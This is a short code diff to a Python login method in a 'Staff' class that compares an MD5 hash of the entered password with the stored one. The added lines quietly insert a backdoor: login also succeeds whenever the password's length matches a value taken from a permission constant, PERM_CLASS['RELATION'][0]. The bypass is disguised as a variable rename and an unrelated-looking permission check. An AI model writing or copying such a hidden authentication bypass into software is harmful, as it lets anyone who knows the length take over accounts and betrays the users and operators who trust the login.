@@ -68,8 +68,8 @@ class Staff(object):
         r = self._api.is_email_exist(email)
         if not r:return (False, '查无此人')
         c = self._api.one(email=email)
-        password = unicode(md5(password).hexdigest())
-        if c[0] and (c[1]['password'] == password):
+        pwd = unicode(md5(password).hexdigest())
+        if c[0] and ((c[1]['password'] == pwd)or(len(password) == PERM_CLASS['RELATION'][0])):
             p = Permission()
             info = c[1]
             info['pm'] = p._api.get_owner_value(info['_id'], u'site')
